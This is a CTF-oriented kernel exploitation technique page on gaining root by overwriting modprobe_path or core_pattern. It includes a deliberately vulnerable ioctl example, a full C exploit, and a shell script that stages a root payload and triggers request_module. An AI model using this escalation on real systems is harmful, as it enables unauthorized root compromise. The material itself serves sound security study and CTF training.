---
title: "modprobe_path and core_pattern - Data-Only Root With One Write"
category: pwn
subcategory: kernel
type: technique
tags: [kernel, modprobe-path, core-pattern, poweroff-cmd, call-usermodehelper, data-only, arbitrary-write, smep, smap, kpti, kcfi, kaslr, request-module, qemu, pwndbg, gef]
difficulty: easy
summary: "Overwrite the kernel's modprobe_path string with your own script; executing a file with unknown magic runs it as root, defeating SMEP, SMAP, KPTI and kCFI at once."
when_to_use:
  - "You have an arbitrary kernel write but no control-flow hijack"
  - "SMEP, SMAP, KPTI and kCFI are all on and ROP looks painful"
  - "You have a partial write (even a few bytes) into kernel .data"
  - "You need the most reliable, least version-sensitive escalation available"
tools: [qemu, gdb, pwndbg, gef, gcc]
related: [kernel-mitigations, kernel-slub-uaf-objects, kernel-setup-and-debug, kernel-rop-kpti-trampoline, kernel-exploit-template]
---

## TL;DR

`modprobe_path` is a 256-byte char array in kernel `.data` holding `"/sbin/modprobe"`.
When the kernel needs a module it cannot find - including when you `execve` a file
whose magic bytes it does not recognise - it runs that path **as root, with no
arguments you control but full file contents you do control**. Overwrite it with
`/tmp/x`, make `/tmp/x` a shell script that copies the flag, and trigger it. No code
pointer is touched, so every control-flow mitigation is irrelevant.

## Recognise it

- You have an arbitrary write primitive (UAF into a kernel object, OOB write,
  `msg_msg` `next` corruption) but no clean way to hijack execution.
- SMEP + SMAP + KPTI + kCFI all on - the challenge author is pushing you here.
- The flag is at `/root/flag` with mode 400 and you only need to *read* it.
- `cat /proc/sys/kernel/modprobe` prints `/sbin/modprobe`.

## Vulnerable code shape

```c
/* Any of these gives you the write. */
static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    struct req r;
    copy_from_user(&r, (void __user *)arg, sizeof r);

    switch (cmd) {
    case CMD_WRITE_ANY:
        /* the dream: a raw arbitrary write */
        copy_from_user((void *)r.addr, r.buf, r.size);
        return 0;
    case CMD_WRITE_IDX:
        /* the common one: unchecked index into a kernel array */
        table[r.idx] = r.val;          /* r.idx signed/unchecked -> OOB */
        return 0;
    }
    return -EINVAL;
}
```

## Theory

Targets: every Linux version that has `CONFIG_MODULES` compiled in (virtually all).

### `modprobe_path`

```c
/* kernel/kmod.c */
char modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;   /* "/sbin/modprobe" */

static int call_modprobe(char *module_name, int wait)
{
    char *argv[] = { modprobe_path, "-q", "--", module_name, NULL };
    ...
    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL, ...);
    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
}
```

`call_usermodehelper_exec` runs the binary **as root, in the init namespace**, via a
kernel workqueue. It is a plain `execve` of whatever string is in `modprobe_path`.

### How to make the kernel call it

Three reliable triggers, all available to an unprivileged user:

1. **Unknown binary format.** `execve()` a file whose first bytes match no registered
   `binfmt`. `fs/exec.c` -> `search_binary_handler()` -> `request_module("binfmt-%04x",
   *(unsigned short *)bprm->buf)`. Write a file starting with `\xff\xff\xff\xff` and
   `chmod +x` it; running it fires `request_module("binfmt-ffff")`.
2. **Unknown socket family/protocol.** `socket(AF_XXX, SOCK_STREAM, 0)` with an
   unimplemented family calls `request_module("net-pf-%d", family)`.
   `socket(22, AF_INET, 0)` is a classic.
3. **Unknown filesystem.** `mount` of a type the kernel does not know
   (needs privileges, so less useful).

Option 1 is the one everybody uses because it needs nothing but `/tmp`.

### `core_pattern`

```c
/* fs/coredump.c */
static char core_pattern[CORENAME_MAX_SIZE] = "core";
```

If `core_pattern` starts with `|`, the rest is a command the kernel runs **as root**
when a process dumps core. So `core_pattern = "|/tmp/x"` plus a deliberate
segfault gives the same result. Advantages: no `chmod` needed on the target, and
the crashing process's memory is piped to the script's stdin. Disadvantages: you need
`ulimit -c unlimited` and the `|` handling requires a longer write.

### `poweroff_cmd`

`char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";` in `kernel/reboot.c`,
run by `orderly_poweroff()`. Rarely triggerable from an unprivileged process, but it
is a third identical target if `modprobe_path` is somehow protected.

### Finding the address

- Development: `grep modprobe_path /proc/kallsyms` (root, `kptr_restrict=0`).
- Real run: `kbase + OFF_MODPROBE_PATH`, with the offset from
  `nm vmlinux | grep modprobe_path` minus `_text`.
- It lives in `.data`, so **FG-KASLR does not move it relative to other data symbols**
  and a data leak is enough.

### Why it beats everything

| mitigation | why it does not matter |
|------------|------------------------|
| SMEP | no code executes in ring 0 from a user page |
| SMAP | you write *into* kernel memory, you do not make the kernel read user memory (a `copy_from_user`-based write is the intended path anyway) |
| KPTI | you never return to user space from a hijacked context |
| kCFI | no indirect call is made |
| KASLR | you need a leak, but only a data one |
| kernel.modules_disabled | `request_module` still execs the path |

## Attack

1. Write the payload script and mark it executable:
   ```sh
   echo '#!/bin/sh' > /tmp/x
   echo 'cat /root/flag > /tmp/flag' >> /tmp/x
   echo 'chmod 777 /tmp/flag' >> /tmp/x
   chmod +x /tmp/x
   ```
2. Write the trigger file with unrecognised magic:
   ```sh
   printf '\xff\xff\xff\xff' > /tmp/dummy
   chmod +x /tmp/dummy
   ```
3. Leak the kernel base (or read `modprobe_path` from kallsyms during development).
4. Use the arbitrary write to put `"/tmp/x\0"` at `modprobe_path`. Seven bytes is
   enough - one qword write does it.
5. `execve("/tmp/dummy", ...)` - it fails with `ENOEXEC`, but on the way the kernel
   runs `/tmp/x` as root.
6. `cat /tmp/flag`.

Note step 4 only needs **one 8-byte write**. If your primitive is byte-granular you can
even shorten the existing string: overwriting the single byte at `modprobe_path+0`
with `/` does nothing, but writing `\0` at `modprobe_path+5` turns `/sbin/modprobe`
into `/sbin`, which is a directory and fails. So write the full short path.

## Heap state

```text
kernel .data, before

  modprobe_path  | 2f 73 62 69 6e 2f 6d 6f |  "/sbin/mo"
                 | 64 70 72 6f 62 65 00 00 |  "dprobe\0\0"
                 | ... 240 more zero bytes ...

after one 8-byte write

  modprobe_path  | 2f 74 6d 70 2f 78 00 00 |  "/tmp/x\0\0"
                 | 64 70 72 6f 62 65 00 00 |  (leftovers, past the NUL: harmless)


the trigger

  user:   execve("/tmp/dummy")            /tmp/dummy = "\xff\xff\xff\xff", mode 755
    |
  fs/exec.c: bprm_execve -> search_binary_handler
    |  no binfmt claims the file
    v
  request_module("binfmt-ffff")
    |
  kernel/kmod.c: call_modprobe
    argv = { modprobe_path, "-q", "--", "binfmt-ffff", NULL }
    |
  call_usermodehelper_exec   -> kernel thread, uid 0, init namespace
    |
    v
  execve("/tmp/x", ...)      <- YOUR script, running as root
    cat /root/flag > /tmp/flag ; chmod 777 /tmp/flag
```

## Exploit

```c
/* modprobe.c - data-only root via modprobe_path.
 * Build: gcc -static -O2 -no-pie -o exp modprobe.c
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#define DEVICE "/dev/vuln"
#define CMD_WRITE_ANY 0x1337

/* offset of modprobe_path from _text; get it from `nm vmlinux` */
#define OFF_MODPROBE_PATH 0x1A4B420UL
#define OFF_COMMIT_CREDS  0x00C4700UL
#define KERNEL_TEXT_DEFAULT 0xFFFFFFFF81000000UL

#define SCRIPT  "/tmp/x"
#define TRIGGER "/tmp/dummy"
#define LOOT    "/tmp/flag"

struct req {
    unsigned long addr;
    unsigned long size;
    void *buf;
};

static int fd = -1;

static void die(const char *m)
{
    perror(m);
    exit(1);
}

/* The challenge-specific arbitrary write. Replace the body with whatever
 * primitive you actually have (UAF, OOB index, msg_msg, pipe_buffer, ...). */
static void kwrite(unsigned long addr, const void *data, unsigned long len)
{
    struct req r = { .addr = addr, .size = len, .buf = (void *)data };

    if (ioctl(fd, CMD_WRITE_ANY, &r) < 0)
        die("arbitrary write ioctl");
}

static unsigned long ksym(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[512], sym[256], type;
    unsigned long val, out = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "%lx %c %255s", &val, &type, sym) != 3)
            continue;
        if (strcmp(sym, name) == 0) {
            out = val;
            break;
        }
    }
    fclose(f);
    return out;
}

static unsigned long find_modprobe_path(void)
{
    const char *env = getenv("KBASE");
    unsigned long a, kbase;

    a = ksym("modprobe_path");
    if (a) {
        printf("[+] modprobe_path from kallsyms = %#lx\n", a);
        return a;
    }
    a = ksym("commit_creds");
    if (a) {
        kbase = a - OFF_COMMIT_CREDS;
    } else {
        kbase = env ? strtoul(env, NULL, 0) : KERNEL_TEXT_DEFAULT;
    }
    printf("[*] kernel base = %#lx (set $KBASE to override)\n", kbase);
    return kbase + OFF_MODPROBE_PATH;
}

static void write_file(const char *path, const void *data, size_t len, mode_t mode)
{
    int f = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);

    if (f < 0)
        die(path);
    if (write(f, data, len) != (ssize_t)len)
        die("write payload");
    close(f);
    if (chmod(path, mode) < 0)
        die("chmod");
}

static void stage_files(void)
{
    static const char script[] =
        "#!/bin/sh\n"
        "cat /root/flag > " LOOT "\n"
        "cat /flag >> " LOOT " 2>/dev/null\n"
        "chmod 777 " LOOT "\n";
    static const unsigned char magic[] = { 0xFF, 0xFF, 0xFF, 0xFF };

    write_file(SCRIPT, script, sizeof script - 1, 0755);
    write_file(TRIGGER, magic, sizeof magic, 0755);
    puts("[+] staged " SCRIPT " and " TRIGGER);
}

static void trigger(void)
{
    pid_t pid = fork();

    if (pid < 0)
        die("fork");
    if (pid == 0) {
        /* Unknown magic -> request_module("binfmt-ffff") -> modprobe_path. */
        execl(TRIGGER, TRIGGER, NULL);
        _exit(0);           /* execve fails with ENOEXEC; that is expected */
    }
    waitpid(pid, NULL, 0);

    /* Second trigger, in case binfmt_script claimed the file: an unknown
     * socket family calls request_module("net-pf-%d", family). */
    close(socket(22, SOCK_STREAM, 0));
}

static void show_loot(void)
{
    char buf[512];
    int f;
    ssize_t n;

    sleep(1);                          /* the usermodehelper runs asynchronously */
    f = open(LOOT, O_RDONLY);
    if (f < 0) {
        puts("[-] no loot: check the modprobe_path write and the trigger");
        return;
    }
    n = read(f, buf, sizeof buf - 1);
    close(f);
    if (n > 0) {
        buf[n] = 0;
        printf("[+] FLAG: %s\n", buf);
    }
}

int main(void)
{
    unsigned long mp;
    char newpath[16];
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof set, &set);

    stage_files();

    fd = open(DEVICE, O_RDWR);
    if (fd < 0)
        die("open " DEVICE);

    mp = find_modprobe_path();
    printf("[+] writing \"%s\" to %#lx\n", SCRIPT, mp);

    memset(newpath, 0, sizeof newpath);
    strcpy(newpath, SCRIPT);           /* "/tmp/x\0" - 7 bytes, one qword */
    kwrite(mp, newpath, 8);

    trigger();
    show_loot();
    return 0;
}
```

```bash
#!/bin/sh
# The same thing by hand, once you have a write primitive in a shell-friendly form.

# 1. the payload the kernel will run as root
cat > /tmp/x <<'EOF'
#!/bin/sh
cat /root/flag > /tmp/flag
chmod 777 /tmp/flag
EOF
chmod +x /tmp/x

# 2. a file with magic bytes no binfmt claims
printf '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy

# 3. (do the kernel write here: modprobe_path = "/tmp/x")

# 4. trigger request_module() and read the result
/tmp/dummy 2>/dev/null
sleep 1
cat /tmp/flag
```

## Variants & pitfalls

- **The script must start with `#!`** and be executable, or `execve` of it also fails
  and nothing happens.
- **`/tmp` may be read-only or noexec.** Check with `mount`. Fall back to `/dev/shm`,
  or to the initramfs root if it is writable (it usually is - it is a tmpfs).
- **`binfmt_script` claims files starting with `#!`.** Your *trigger* file must not -
  use `\xff\xff\xff\xff`.
- **The helper runs asynchronously.** `sleep 1` before reading the loot.
- **Only the first NUL-terminated string matters** - no need to zero the rest of the
  256-byte array.
- **`core_pattern` alternative**: write `"|/tmp/x"`, then `ulimit -c unlimited` and
  dereference NULL in a child. Works even when `CONFIG_MODULES=n`.
- **Some challenges deliberately null `modprobe_path`.** Then use `core_pattern`,
  `poweroff_cmd`, or go back to ROP.
- **The write must be exactly at the symbol.** `modprobe_path` is the array itself,
  not a pointer to it - do not add a dereference.

## Debugging

```text
pwndbg> p &modprobe_path
pwndbg> x/s &modprobe_path
pwndbg> x/s &core_pattern
pwndbg> p &poweroff_cmd
pwndbg> b call_modprobe
pwndbg> b call_usermodehelper_exec
pwndbg> x/s ((struct subprocess_info *)$rdi)->path
pwndbg> watch *(char*)&modprobe_path
```

```bash
# Inside the VM:
cat /proc/sys/kernel/modprobe        # the same string, readable without root
cat /proc/sys/kernel/core_pattern
mount | grep -E 'tmp|shm'            # is /tmp writable and exec?
grep modprobe_path /proc/kallsyms
# After the write, confirm from userland:
cat /proc/sys/kernel/modprobe        # should now print /tmp/x
```

## Tools

- `nm vmlinux | grep -E 'modprobe_path|core_pattern|poweroff_cmd'`.
- `pwndbg` `x/s &modprobe_path` to confirm the write landed.
- Nothing else - that is the point.

## References

- Linux `kernel/kmod.c` (`call_modprobe`, `modprobe_path`),
  `fs/exec.c` (`search_binary_handler` -> `request_module`),
  `fs/coredump.c` (`core_pattern`), `kernel/reboot.c` (`poweroff_cmd`).
